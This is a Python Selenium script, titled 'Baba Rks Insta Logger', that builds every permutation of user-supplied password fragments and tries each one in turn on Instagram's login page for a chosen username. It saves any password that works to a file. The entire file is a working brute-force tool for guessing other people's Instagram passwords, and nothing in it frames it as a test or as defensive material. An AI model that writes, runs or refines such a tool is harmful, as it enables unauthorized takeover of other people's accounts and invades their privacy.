import time
import itertools
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

# Instagram login details
url = "https://www.instagram.com/accounts/login/"

# Initialize the web driver
driver = webdriver.Chrome('C:\Program Files\Google\Chrome\Application')

# Function to log in to Instagram
def login_instagram(username, password):
    driver.get(url)
    time.sleep(2)

    username_input = driver.find_element(By.NAME, "username")
    password_input = driver.find_element(By.NAME, "password")

    username_input.send_keys(username)
    password_input.send_keys(password)
    password_input.send_keys(Keys.ENTER)

    # Wait for the login process to complete
    time.sleep(5)

    # Check if login was successful
    if "accounts/login" in driver.current_url:
        print("Login failed for password:", password)
        return False
    else:
        print("Login successful with password:", password)
        return True

# Function to generate combinations
def generate_combinations(blocks):
    combinations = []

    for combination in itertools.permutations(blocks, len(blocks)):
        combinations.append(combination)

    return combinations

# Prompt for Instagram username
username = input("Baba Rks Insta Logger ::::: Enter the Instagram username: ")

# Take user input for the number of blocks
num_blocks = int(input("Enter the number of blocks: "))

# Take user input for the actual block inputs
blocks = []
for i in range(num_blocks):
    block = input(f"Enter block {i+1}: ")
    blocks.append(block)

# Generate combinations
combinations = generate_combinations(blocks)

# Save the output in a text file
with open('combinations_output.txt', 'w') as file:
    for combination in combinations:
        file.write(''.join(combination) + '\n')

print("Combinations generated and saved in 'combinations_output.txt' file.")

# Loop through the passwords and perform login
with open('combinations_output.txt', 'r') as file:
    passwords = [line.strip() for line in file]

tried_passwords = []

for password in passwords:
    if login_instagram(username, password):
        with open('successful_password.txt', 'w') as file:
            file.write(password)
        break
    else:
        print("Tried password:", password)
        tried_passwords.append(password)

# Save the tried passwords to a separate file
with open('tried_passwords.txt', 'w') as file:
    for password in tried_passwords:
        file.write(password + '\n')

# Close the web driver
driver.quit()

